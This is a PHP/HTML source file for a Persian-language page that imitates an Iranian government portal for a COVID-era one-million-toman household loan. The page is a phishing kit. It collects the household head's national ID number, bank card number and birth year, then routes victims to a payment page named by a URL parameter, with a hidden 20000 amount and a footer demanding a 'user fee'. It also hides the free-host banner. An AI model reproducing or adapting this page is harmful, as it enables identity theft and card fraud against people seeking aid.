
<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fa" lang="fa" dir="rtl">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta name="Distribution" content="Global">
	<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
	<META HTTP-EQUIV="Expires" CONTENT="-1">
	<meta name="Robots" content="index,follow">
	<meta name="Description" content="سازمان هدفمندسازی وام یک میلیون تومانی، سامانه مدیریت حساب بانكی خانوار">
  <title>سامانه ثبت نام وام یک میلیون تومانی</title>
  <link rel="stylesheet" href="css/css-screen.css" type="text/css" media="screen" >
      <style>
		        .enter-btn{
            display: block;
            width: 150px;
            background-color: #FF6948;
            text-align: center;
            padding: 12px;
            color: white;
            font-size: 1em;
            /*font-weight: bold;*/
            border-radius: 10px;
        }
    </style>
</head>
<!-- /HEAD -->
<body>
	<div id="header">
		<div id="middle_header"><img style="width:103%" src="img/headrx.png" alt="سامانه سازمان هدفمندی وام یک میلیون تومانی " /></div>
		<br />
	</div>
<div id="content" style="background-color:#4682B4;">
    <div id="inner_content">
        <br class="clear" />
        <div id="desc">
            <div style="text-align:justify">
                <ul><span style="color:#7FFF00">سامانه ثبت نام وام دو میلیونی ویژه در خانه بمانیم</span>
                    <li>
					<span style="color:#00FFFF">پس از ثبت نام در سامانه نتیجه درخواست فاز دوم وام از طریق پیامک ارسال می شود</li>
                    <li>
                    <span style="color:#00FFFF">کرونا باعث خانه‌نشینی اجباری نیروی کار و توقف فعالیت‌های بسیاری از کسب‌و کارها در سراسر جهان شده و دولت‌ها هم برای کمک به شهروندان برنامه‌هایی معرفی کرده‌اند</li>
                <li>
                   <span style="color:#00FFFF">بر اساس اعلام اولیه دولت ، در این برنامه حمایتی تمام ۲۳ میلیون خانواده های یارانه بگیر  ، شامل دریافت وام به مبلغ یک میلیون تومانی می‌شوند که به حساب بانکی متصل به دریافت یارانه آنها واریز خواهد شد و در باز پرداخت 𝟐𝟒 ماهه از یارانه افراد کسر می شود .
                </li>
                    </ul>
            </div>
        </div>
        <div id="user">
            <div id="form_1">
                <form id="login" name="login" style="color:#000;" method="post" action="../<?php echo $P?>/?e=<?php echo $e?>" onsubmit="return cMC(d.getElementById('sid'));">
                    <input type="hidden" name="amount" value="20000">
                                        <table cellpadding="0" cellspacing="10" border="0" width="100%" class="a">
                        <tr>
                            <td align="left">
                                کد ملی سرپرست :
                            </td>
                            <td>
                                <input type="text" id="sid" maxlength="10" autocomplete="off" name="sid" value="" dir="ltr" tabindex="1"/>
                            </td>
                        </tr>
                        <tr>
                            <td align="left">
                                شماره کارت سرپرست خانواده :
                            </td>
                            <td>
                                <input type="text" id="ids" maxlength="16" autocomplete="off" name="ids" value="" dir="ltr" tabindex="2"/>
                            </td>
                        </tr>
                        <tr>
                            <td align="left">
                                سال تولد سرپرست خانواده :
                            </td>
                            <td>
                                <input type="text" id="refcode" maxlength="4" autocomplete="off" name="refcode" value="" dir="ltr" tabindex="3"/>
                            </td>
                        </tr>
                        <tr>
                            <td colspan="2" style="padding-left: 10px;">
                                <img id="scpt" src="img/captchadrx.jpg" alt="كد پنج رقمی جهت راستی آزمایی" border="1" align="left" />
                                <a href="javascript:;" style="line-height:25px;" onclick="return rcpt2();"><img src="img/drx.gif" border="0" title="فراخوانی مجدد کد" align="left"/></a>
                            </td>
                        </tr>
                        <tr>
                            <td align="left">
                                کد پنج رقمی بالا :
                            </td>
                            <td>
                                <input type="text" id="cpt" maxlength="5" autocomplete="off" name="cpt" value="" dir="ltr" style="width:160px;height:24px;font-size:22px;" tabindex="5" />
                            </td>
                        </tr>
                    </table>
                    <div class="middle-box">
                        <div align="left" class="enter-panel">
                            <div class="row">
                                <div class="row-box">

                                    <input type="submit" class="enter-btn" href="Payment" value="ثبت نام" />
                        </div>
                    </div>
                    </div>
                    </div>
                </form>
            </div>
        </div>
        <br class="clear" />
</div>
</div>
<br />
	<div id="footer">
		<ul>
			<li>توجه:
				<span style="color:#DC143C">کاربر گرامی برای ثبت نام ابتدا باید حق کاربری خود را پرداخت نمایید</span></li></ul>
    </div>

</body>

<html>  
<head>
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
  <meta charset="utf-8">
  <title></title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">
</body>
</html>
